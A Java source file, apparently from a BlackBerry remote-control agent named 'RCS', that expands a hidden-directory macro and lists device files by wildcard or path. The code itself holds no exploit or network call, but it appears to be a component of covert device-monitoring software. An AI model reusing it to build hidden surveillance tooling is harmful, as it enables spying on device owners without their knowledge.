//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.fs;

import java.io.IOException;
import java.util.Enumeration;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.util.EmptyEnumeration;
import net.rim.device.api.util.ObjectEnumerator;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class Directory {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Directory", DebugLevel.VERBOSE);
    //#endif

    public static String hiddenDirMacro = "$dir$";

    public static String expandMacro(String filename) {
        final int macro = filename.indexOf(hiddenDirMacro, 0);
        String expandedFilter = filename;
        if (macro == 0) {
            //#ifdef DEBUG
            debug.trace("expanding macro");
            //#endif
            //final String first = filter.substring(0, macro);
            final String end = filename.substring(macro
                    + hiddenDirMacro.length(), filename.length());
            expandedFilter = Utils.chomp(Path.USER(), "/") + end; //  Path.UPLOAD_DIR

            //#ifdef DEBUG
            debug.trace("expandedFilter: " + expandedFilter);
            //#endif
        }
        return expandedFilter;
    }

    public static Enumeration find(String filter) {

        //#ifdef DBC
        Check.requires(!filter.startsWith("file://"),
                "find filter shouldn't start with file:// : " + filter);
        //#endif

        if (filter.indexOf('*') >= 0) {
            //#ifdef DEBUG
            debug.trace("asterisc");
            //#endif

            // filter
            String baseDir = filter.substring(0, filter.lastIndexOf('/'));
            final String asterisc = filter
                    .substring(filter.lastIndexOf('/') + 1);

            if (baseDir == "") {
                baseDir = "/";
            }

            FileConnection fconn = null;
            try {
                fconn = (FileConnection) Connector.open("file://" + baseDir,
                        Connector.READ);

                if (!fconn.isDirectory() || !fconn.canRead()) {
                    //#ifdef DEBUG
                    debug.error("not a dir or cannot read");
                    //#endif
                    return new EmptyEnumeration();
                }

                return fconn.list(asterisc, true);

            } catch (final IOException ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            } finally {
                try {
                    if (fconn != null)
                        fconn.close();
                } catch (IOException e) {
                }
            }
        } else {
            // single file
          //#ifdef DEBUG
            debug.trace("single file");
            //#endif
            FileConnection fconn = null;
            try {
                fconn = (FileConnection) Connector.open("file://" + filter,
                        Connector.READ);

                if (!fconn.exists() || fconn.isDirectory() || !fconn.canRead()) {
                    //#ifdef DEBUG
                    debug.error("not exists, a dir or cannot read");
                    //#endif
                    return new EmptyEnumeration();
                }

                return new ObjectEnumerator(new Object[] { fconn });

            } catch (final IOException ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
                fconn = null;
            } finally {
                try {
                    //#ifdef DEBUG
                    debug.trace("closing");
                    //#endif
                    if (fconn != null)
                        fconn.close();
                } catch (Exception e) {
                }
            }
        }

        //#ifdef DEBUG
        debug.trace("exiting");
        //#endif
        return new EmptyEnumeration();
    }
}
